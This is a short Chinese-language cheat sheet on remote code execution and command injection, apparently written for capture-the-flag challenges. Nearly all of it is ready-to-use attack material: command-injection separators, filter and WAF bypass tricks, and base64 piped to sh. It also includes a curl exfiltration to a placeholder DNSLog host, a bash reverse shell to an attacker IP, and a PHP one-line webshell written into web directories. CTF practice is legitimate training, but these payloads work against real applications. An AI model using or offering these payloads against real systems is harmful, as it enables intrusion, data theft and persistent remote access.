# 远程代码执行 (RCE) / 命令注入指南

1. **探测点寻找**:
   - GET/POST 参数、文件上传、HTTP Header、URL、IP 输入框 (如 `ping` 测试功能)。
   - **执行函数点**: `eval()`, `system()`, `exec()`, `shell_exec()`, `passthru()`, `` ` `` 等。

2. **验证注入**:
   - 尝试追加命令: `127.0.0.1; whoami`, `| whoami`, `& whoami`, `|| whoami`, `%0a whoami`。
   - 使用延时命令测试: `ping -c 3 127.0.0.1`, `sleep 5`。

3. **过滤绕过 (Bypass WAF)**:
   - **空格过滤**: 使用 `<`、`$IFS`、`${IFS}`、`%09`、`{cat,flag}` 绕过。
   - **关键字过滤** (如 `cat`, `flag`): 尝试通配符 `c?t f*`, 单引号/双引号 `c'a't fl""ag`, 反斜杠 `ca\t fl\ag`, 变量拼接 `$a=ca;$b=t;$a$b flag`, Base64 编码 `echo Y2F0IGZsYWc= | base64 -d | sh`。
   - **无回显 (Blind RCE)**: 使用 DNSLog (如 `curl http://YOUR_DNSLOG.com/\`whoami\``), 反弹 Shell (`bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1`), 写文件 (`echo '<?php eval($_POST[1]);?>' > shell.php`)。

4. **利用策略**:
   - 找到可读写目录（如 `/tmp/`，`/var/www/html/uploads/`）写入一句话木马或执行脚本。
   - 通过反弹 Shell (Reverse Shell) 获取交互式命令行环境。

5. **获取 Flag**:
   - 直接读取文件: `cat /flag`, `tac /flag`, `head /flag`, `tail /flag`, `less /flag`, `more /flag`, `awk '{print}' /flag`, `nl /flag`, `od -c /flag`。
   - 查找文件: `find / -name "flag*"`, `grep -rn "flag{" /`。